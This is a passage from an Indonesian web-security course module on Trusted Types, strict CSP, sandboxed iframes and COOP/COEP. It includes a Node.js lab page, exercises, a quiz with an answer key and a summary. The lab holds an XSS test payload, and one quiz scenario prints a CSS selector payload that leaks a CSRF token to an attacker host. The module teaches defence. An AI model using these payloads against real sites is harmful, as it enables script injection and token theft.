  <script nonce="${nonce}" src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.8/purify.min.js"></script>
</head>
<body>
  <h1>DOM Security Engine Runtime</h1>
  
  <div class="card">
    <h3>Input Konten Pengguna (Raw HTML)</h3>
    <textarea id="payload" style="width: 100%; height: 80px;">Payload Uji: <img src=x onerror="alert('Eksploitasi Berhasil!')"> Normal Text</textarea>
    <br><br>
    <button id="btn-secure" class="btn">Injeksi Aman (Trusted Types)</button>
    <button id="btn-violation" class="btn danger">Injeksi Melanggar (Raw String Sink)</button>
  </div>

  <div class="card">
    <h3>Container Output Ter-render</h3>
    <div id="display-mount">Konten akan dirender di sini...</div>
  </div>

  <script nonce="${nonce}">
    // 1. Definisikan Trusted Types Policy
    let securePolicy;
    if (window.trustedTypes) {
      securePolicy = window.trustedTypes.createPolicy('secure-render', {
        createHTML: (string) => {
          // Bersihkan via DOMPurify
          return DOMPurify.sanitize(string);
        }
      });
    }

    const mount = document.getElementById('display-mount');
    const input = document.getElementById('payload');

    // Action 1: Prosedur Aman
    document.getElementById('btn-secure').addEventListener('click', () => {
      const untrustedData = input.value;
      // Gunakan policy untuk memvalidasi dan mengubah tipe data menjadi TrustedHTML
      const trustedValue = securePolicy ? securePolicy.createHTML(untrustedData) : DOMPurify.sanitize(untrustedData);
      
      console.log('Tipe Objek yang di-assign:', Object.prototype.toString.call(trustedValue));
      mount.innerHTML = trustedValue;
    });

    // Action 2: Trigger Pelanggaran Langsung (Simulasi Serangan atau Kode Warisan Rusak)
    document.getElementById('btn-violation').addEventListener('click', () => {
      const untrustedData = input.value;
      try {
        // Ini akan memicu fatal error di DevTools Console dan CSP reporting jika default policy tidak mengizinkan raw bypass!
        mount.innerHTML = untrustedData;
      } catch (err) {
        console.error('Intersepsi Berhasil! Browser menolak assignment mentah:', err.message);
      }
    });
  </script>
</body>
</html>`);
});

app.listen(PORT, () => {
  console.log(`[SECURITY ENVIRONMENT STARTED]: http://localhost:${PORT}`);
});
```

### Langkah 2: Menjalankan dan Menguji
1. Jalankan aplikasi: `node server.js`
2. Buka browser Chromium (Google Chrome / Brave / Edge) pada `http://localhost:3000`.
3. Buka tab **Console** di Developer Tools.
4. Klik tombol merah **"Injeksi Melanggar (Raw String Sink)"**. Perhatikan bahwa browser melempar exception:
   `Uncaught TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.`
5. Klik tombol biru **"Injeksi Aman (Trusted Types)"**. Perhatikan payload dinetralisasi tanpa ada script alert yang meletus, sementara node `Normal Text` dirender dengan bersih.

---

## 13. Exercise

### Level Easy
Modifikasi file `server.js` dari sesi praktikum untuk menambahkan directive CSP `style-src-attr` agar sistem melarang penggunaan atribut `style=""` secara langsung pada seluruh elemen HTML, namun tetap mengizinkan penggunaan `<style>` tag yang memiliki nonce valid. Validasi implementasi Anda dengan memasukkan input `<p style="color:red">Teks</p>` dan pastikan atribut warnanya diabaikan oleh browser rendering engine.

### Level Medium
Buat policy Trusted Types kedua bernama `table-policy` yang hanya mengizinkan tag-tag tabel semantik: `['TABLE', 'THEAD', 'TBODY', 'TR', 'TH', 'TD']`. Modifikasi policy factory agar menolak memproses string input (throw explicit `Error`) jika ditemukan elemen di luar daftar tag tabel yang diizinkan, **sebelum** input tersebut diserahkan ke sanitizer DOMPurify.

### Level Hard
Buat script custom Hook untuk DOMPurify yang membedah node berbasis Abstract Syntax Tree sederhana. Hook tersebut harus mendeteksi keberadaan tag MathML `<math>` dan `<annotation-xml>` di dalam string payload dan secara rekursif menghapus semua elemen bersarang jika atribut `encoding` pada `<annotation-xml>` bernilai selain `text/html`. Tulis unit test skenario untuk membuktikan bahwa hook Anda kebal terhadap vektor mutasi MathML mXSS CVE-2020-26870.

---

## 14. Challenge

### Studi Kasus: "The Zero-Trust Dashboard Isolation Migration"

**Deskripsi Masalah:**
Sebuah platform perbankan investasi multinasional memiliki portal internal berusia 10 tahun berbasis monolit. Portal ini memuat:
1. Ribuan inline event handler (`onclick="doAction()"`) yang tersebar di legacy JSP/HTML views.
2. Library visualisasi bagan usang yang memanggil `eval()` untuk menguraikan data respons API.
3. Kebutuhan compliance regulasi baru dari otoritas keuangan: Seluruh aplikasi portal wajib menerapkan **Strict Content-Security-Policy Level 3** (tanpa `'unsafe-inline'` untuk script execution dan tanpa `'unsafe-eval'`), serta **Trusted Types API** dalam waktu 3 bulan ke depan, tanpa downtime dan tanpa mematahkan alur kerja operasional trader.

**Tugas Arsitektur:**
Rancang cetak biru (blueprint) migrasi komprehensif yang mencakup:
1. **Fase Transisi (Telemetry & Shadow Ingestion):** Bagaimana Anda menggunakan header `Content-Security-Policy-Report-Only` bersama dengan `Reporting-Endpoints` untuk mengaudit seluruh violation sink di produksi secara real-time tanpa memblokir fungsionalitas pengguna?
2. **Reverse Proxy Architecture:** Rancang skema arsitektur NGINX / Cloudflare Workers untuk menginjeksi *per-request nonces* secara dinamis ke halaman HTML legacy tanpa harus mengubah source code backend lama secara massal.
3. **Legacy Shim Strategy:** Bagaimana merancang safe-wrapper atau polyfill layer untuk `eval()` menggunakan WebAssembly sandbox atau Safe Evaluator Worker terisolasi via COOP/COEP?
4. **Deliverable Dokumen:** Sajikan diagram urutan (sequence diagram), konfigurasi CSP bertahap (Phase 1, Phase 2, Phase 3), serta mitigasi fallback untuk browser non-supporting.

---

## 15. Quiz Evaluasi Pemahaman

### Bagian A: 5 Pertanyaan Basic

1. **Apa perbedaan mendasar antara mengeksekusi sanitasi HTML menggunakan regex vs menggunakan parser DOM in-memory?**
   * A. Regex lebih lambat tetapi mampu mendeteksi context boundary mutation.
   * B. Regex tidak memiliki state machine tree-construction sehingga rentan context-switching bypass; DOM parser memetakan token sesuai hierarki native tree browser.
   * C. Regex aman digunakan untuk inline event handler, sedangkan DOM parser hanya untuk tag semantik.
   * D. DOM parser tidak mampu membaca data attribute kustom.

2. **Manakah dari sink berikut yang BUKAN merupakan target penegakan W3C Trusted Types?**
   * A. `Element.innerHTML`
   * B. `HTMLScriptElement.src`
   * C. `document.write`
   * D. `Element.textContent`

3. **Directive CSP manakah yang WAJIB dimatikan atau dihindari total agar implementasi nonce Level 3 tidak menjadi sia-sia?**
   * A. `strict-dynamic`
   * B. `'unsafe-inline'` pada environment tanpa dukungan CSP Level 3
   * C. `'unsafe-eval'`
   * D. `object-src 'none'`

4. **Apa nilai default atribut `origin` dari sebuah `iframe` yang diproteksi hanya dengan atribut `sandbox="allow-scripts"`?**
   * A. Sama dengan parent origin.
   * B. Subdomain dari parent origin.
   * C. Origin unik yang dievaluasi sebagai `null`.
   * D. Mengikuti origin skrip penginjeksi.

5. **Apa fungsi utama dari directive Cross-Origin Opener Policy (`COOP: same-origin`)?**
   * A. Mengizinkan pembacaan cookie lintas subdomain.
   * B. Memutus referensi `window.opener` dan memindahkan dokumen window baru ke dalam browsing context group / proses OS yang terpisah.
   * C. Mengenkripsi transmisi fetch data antar API.
   * D. Mencegah website lain melakukan framing (Clickjacking protection).

---

### Bagian B: 5 Pertanyaan Intermediate

6. **Mengapa kombinasi atribut `sandbox="allow-scripts allow-same-origin"` dianggap sebagai fatal security flaw jika dokumen di dalam iframe di-host pada origin yang sama dengan aplikasi utama?**
   * A. Karena iframe akan menolak memuat script eksternal.
   * B. Karena script di dalam iframe dapat memanipulasi atribut sandbox-nya sendiri dan mengakses storage/cookies dari parent page tanpa batas.
   * C. Karena CSP tidak dapat diterapkan di dalam iframe yang memiliki origin sama.
   * D. Karena memicu race condition pada Service Worker browser.

7. **Pada CSP Level 3, jika deklarasi header menyertakan `'nonce-random123'` sekaligus `'strict-dynamic'`, apa yang akan terjadi pada browser modern saat script yang memiliki nonce valid mencoba menambahkan tag `<script src="...">` baru via DOM API?**
   * A. Script baru akan diblokir kecuali domain sumbernya ada di directive allowlist.
   * B. Script baru akan otomatis diizinkan karena kepercayaan (trust) diteruskan dari parent script yang valid secara dinamis.
   * C. Browser akan melempar peringatan warning di console dan menghentikan seluruh thread eksekusi.
   * D. Browser mewajibkan pembuatan nonce baru untuk tag script dinamis tersebut.

8. **Bagaimana mekanisme *Mutation XSS (mXSS)* dapat menembus library sanitasi yang tampak solid?**
   * A. Dengan membanjiri memory buffer sanitasi hingga terjadi buffer overflow.
   * B. Memanfaatkan perbedaan penafsiran parsing state antara parser sanitasi (HTML context) dan parser rendering engine browser (SVG/MathML foreign content context) saat serialisasi `.innerHTML`.
   * C. Mengubah encoding payload dari UTF-8 menjadi base64 secara dinamis di level transit.
   * D. Mengeksploitasi dynamic typing pada runtime V8 engine.

9. **Apa konsekuensi mengaktifkan status Cross-Origin Isolated (`COOP: same-origin` dan `COEP: require-corp`) terhadap aset eksternal (seperti gambar dari CDN publik)?**
   * A. Gambar akan langsung dikompresi ke format WebP.
   * B. Seluruh resource eksternal akan diblokir browser kecuali disajikan dengan header `Cross-Origin-Resource-Policy` yang sesuai atau lolos validasi CORS.
   * C. Browser menonaktifkan cache untuk seluruh gambar tersebut.
   * D. Tidak ada dampak terhadap aset gambar, kebijakan ini hanya berlaku untuk script.

10. **Ketika Trusted Types aktif dengan policy `require-trusted-types-for 'script'`, bagaimana cara menangani library third-party yang belum di-refactor dan masih menggunakan string assignment ke innerHTML tanpa mematikan security policy aplikasi secara global?**
    * A. Menambahkan directive `'unsafe-trusted-types'` pada CSP header.
    * B. Mengimplementasikan policy khusus bernama `default` yang memanggil fungsi sanitasi aman (seperti DOMPurify) untuk mengintersepsi seluruh raw string assignment secara global.
    * C. Membungkus entire application di dalam Web Worker.
    * D. Mengganti semua tag `<div>` menjadi `<shadow-root>`.

---

### Bagian C: 3 Skenario Kasus Produksi

11. **Skenario 1:** Sebuah aplikasi SaaS HR Core mendadak mengalami insiden di mana penyerang berhasil mengeksfiltrasi CSRF token pengguna. Setelah audit forensik, ditemukan bahwa tidak ada script yang dieksekusi (`script-src` CSP berfungsi sempurna, zero inline script executed). Namun, penyerang berhasil menyuntikkan markup inline style berikut melalui celah pada field bio profil:
    ```html
    <style>
      input[name="_csrf"][value^="a"] { background: url('https://attacker.io/leak?v=a'); }
      input[name="_csrf"][value^="b"] { background: url('https://attacker.io/leak?v=b'); }
    </style>
    ```
    **Langkah arsitektur manakah yang PALING EFEKTIF untuk memitigasi vektor serangan ini secara struktural?**
    * A. Mengubah metode request dari POST menjadi GET.
    * B. Menambahkan `style-src 'nonce-...'` dan menghapus `'unsafe-inline'` dari `style-src`, serta menerapkan sanitasi ketat yang membuang tag `<style>` dan pola `url()` pada inline style attributes.
    * C. Mengenkripsi nilai CSRF token menggunakan public key penyerang.
    * D. Memaksa input token menggunakan elemen `<textarea>` alih-alih `<input>`.

12. **Skenario 2:** Tim frontend Anda melaporkan bahwa setelah mengaktifkan Strict Nonce-based CSP, halaman HTML statis utama aplikasi yang disajikan melalui Cloudflare CDN mengalami lonjakan cache-miss hingga 100%. Latensi p95 melonjak drastis dari 40ms menjadi 450ms. Hal ini terjadi karena header CSP nonce harus dibuat dinamis dan unik untuk setiap pengguna/request, sehingga CDN tidak dapat meng-cache response HTML.
    **Apa pola arsitektur caching yang paling tepat untuk memulihkan performa CDN tanpa mengorbankan keamanan Strict Nonce CSP?**
    * A. Mengganti nonce dengan nilai statis yang di-update seminggu sekali.
    * B. Menghapus nonce dan kembali ke allowlist CSP Level 2 domain CDN.
    * C. Menggunakan Edge Workers / Cloudflare Workers untuk meng-cache shell HTML statis di edge, lalu men-generate nonce unik per-request di level edge runtime dan menginjeksi nonce tersebut ke response header serta placeholder script tag secara stream-based (*Edge HTML Rewriting*).
    * D. Memindahkan seluruh skrip aplikasi ke tag inline `style`.

13. **Skenario 3:** Aplikasi perbankan Anda menggunakan Web Workers untuk memproses data finansial bervolume besar secara multi-threaded menggunakan `SharedArrayBuffer`. Namun, pengguna di beberapa cabang kantor melaporkan bahwa fitur kalkulasi ini melempar error: `ReferenceError: SharedArrayBuffer is not defined`.
    **Apa akar masalah teknis dan kombinasi konfigurasi header yang hilang pada server aplikasi?**
    * A. Server kehilangan header `Access-Control-Allow-Origin: *`.
    * B. Browser menonaktifkan `SharedArrayBuffer` karena dokumen tidak berada dalam status *Cross-Origin Isolated*; server harus menyertakan header `Cross-Origin-Opener-Policy: same-origin` dan `Cross-Origin-Embedder-Policy: require-corp` (atau `credentialless`).
    * C. Memori RAM komputer pengguna kurang dari 4 GB, memicu proteksi bawaan OS.
    * D. W3C Trusted Types memblokir Worker instantiation secara default.

---

### Kunci Jawaban & Pembahasan

#### Bagian A:
1. **B** — Regex tidak memiliki representasi tree struktural dan state transition sehingga mudah dikecoh oleh context switching (SVG/MathML vs HTML), sedangkan DOM parser memproses token ke hierarki dokumen nyata.
2. **D** — `Element.textContent` secara desain aman karena selalu memperlakukan input sebagai string teks biasa, bukan sebagai eksekusi kode atau parsing markup; oleh karena itu ia bukan target injection sink Trusted Types.
3. **C** — `'unsafe-eval'` mengizinkan kompilasi string dinamis menjadi kode mesin via `eval()`, mematikan proteksi eksekusi kode arbitrer yang telah dibangun oleh nonce.
4. **C** — Tanpa izin `allow-same-origin`, sandboxed iframe diperlakukan sebagai unique origin (`null`), sehingga tidak memiliki hak akses SOP ke origin mana pun.
5. **B** — `COOP: same-origin` memutus relasi pointer opener window dan memaksa browser merender window target pada OS process terisolasi.

#### Bagian B:
6. **B** — Jika iframe memuat script pada origin yang sama dengan induknya, script jahat dapat mengakses DOM induk (`window.parent`), membaca storage/auth-token, dan menghapus batasan iframe sandbox itu sendiri.
7. **B** — Fitur utama `'strict-dynamic'` pada CSP Level 3 adalah *dynamic propagation of trust*, di mana script yang telah divalidasi via nonce dapat memanggil script eksternal lain secara aman via manipulasi DOM element.
8. **B** — mXSS terjadi akibat mutasi pohon dokumen saat parsing ulang serialisasi HTML (`innerHTML`), di mana browser mereorganisasi nesting elemen asing (foreign content) menjadi elemen HTML biasa yang dapat mengeksekusi script.
9. **B** — Dokumen dengan status Cross-Origin Isolated menerapkan pembatasan ketat pada semua sub-resource; resource lintas origin tanpa header `CORP` atau CORS eksplisit akan diblokir oleh engine browser.
10. **B** — Pembuatan policy dengan nama `default` pada Trusted Types bertindak sebagai filter fallback otomatis untuk menangani assignation string legacy tanpa merusak integrasi library pihak ketiga.

#### Bagian C:
11. **B** — Serangan tersebut adalah *CSS Data Exfiltration Attack*. Mitigasinya adalah membatasi evaluasi tag `<style>` via nonce strict CSP, serta menyaring selector atribut sensitif dan sintaks fungsi `url()` pada tingkat hook parser sanitasi.
12. **C** — Memanfaatkan Edge HTML Rewriter di CDN memungkinkan halaman HTML di-cache secara permanen di edge cache, sementara nonce di-generate secara instan (sub-millisecond) di edge network sebelum diserahkan ke client, menjaga latensi tetap rendah dan keamanan tetap maksimal.
13. **B** — Akses ke `SharedArrayBuffer` dibatasi pasca-penemuan Spectre. Browser mewajibkan lingkungan konteks browsing berada dalam status *Cross-Origin Isolated* yang hanya dapat dibuka melalui pasangan header `COOP: same-origin` dan `COEP: require-corp` / `credentialless`.

---

## 16. Summary

1. **Evolusi Keamanan DOM:** Pertahanan web modern telah bertransisi dari sanitasi string pasif (escaping) ke sistem penegakan runtime terintegrasi pada browser engine melalui **W3C Trusted Types** dan **Strict CSP Level 3**.
2. **Mitigasi Mutation XSS (mXSS):** mXSS timbul dari disparitas state-machine tokenizer saat menangani foreign content (SVG/MathML). DOMPurify yang diperkuat dengan custom hooks dan validasi Trusted Types adalah solusi lini depan terbaik untuk rendering markup kaya.
3. **Strict Nonce Architecture:** Menggantikan allowlist CSP usang dengan nonce kriptografis per-request (minimal 128-bit) yang dipadukan dengan `'strict-dynamic'`, mengeliminasi risiko bypass script gadgets dan eksploitasi CDN JSONP.
4. **Process-Level Isolation:** Menggabungkan atribut `iframe` sandbox yang ketat dengan isolasi proses OS tingkat lanjut (**COOP**, **COEP**, dan **CORP**) memberikan mitigasi tuntas terhadap serangan side-channel memori (Spectre) serta memastikan komponen pihak ketiga berjalan dalam sandbox origin `null` tanpa akses kredensial.